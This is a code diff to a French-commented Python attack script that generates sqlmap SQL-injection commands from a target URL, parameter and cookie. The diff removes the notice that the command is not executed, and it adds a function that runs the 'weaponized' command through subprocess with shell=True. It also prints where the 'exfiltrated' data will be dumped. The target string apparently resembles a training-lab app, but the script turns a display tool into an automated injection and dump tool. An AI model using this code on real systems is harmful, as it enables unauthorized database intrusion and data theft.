@@ -3,6 +3,7 @@ import requests
 from bs4 import BeautifulSoup
 import hashlib
 import os
+import subprocess
 
 # ================== CONFIGURATION ==================
 
@@ -79,7 +80,6 @@ def show_weaponized_payload(command):
     print("\n═══ Phase de Weaponization ═══")
     print("Commande sqlmap générée (théorique) :\n")
     print(command)
-    print("\n(La commande n'est pas exécutée automatiquement.)\n")
 
 def predict_sqlmap_output_folder(url):
     """
@@ -97,6 +97,19 @@ def show_expected_dump_path(url):
     print("Chemin de sortie attendu pour les données exfiltrées :")
     print(folder)
     print()
+
+def run_sqlmap(command_str):
+    """
+    Exécute la commande sqlmap générée.
+    Affiche la sortie dans le terminal.
+    """
+    print("→ Exécution de sqlmap en cours...\n")
+    try:
+        subprocess.run(command_str, shell=True, check=True)
+    except subprocess.CalledProcessError as e:
+        print("Erreur lors de l'exécution de sqlmap :")
+        print(e)
+
 
 # ================== MAIN ==================
 
@@ -134,6 +147,7 @@ def main():
     cmd = generate_sqlmap_command(URL + "?id=1&Submit=Submit", target_param, cookie_str)
     show_weaponized_payload(cmd)
     show_expected_dump_path(URL)
+    run_sqlmap(cmd)
 
 if __name__ == "__main__":
     main()
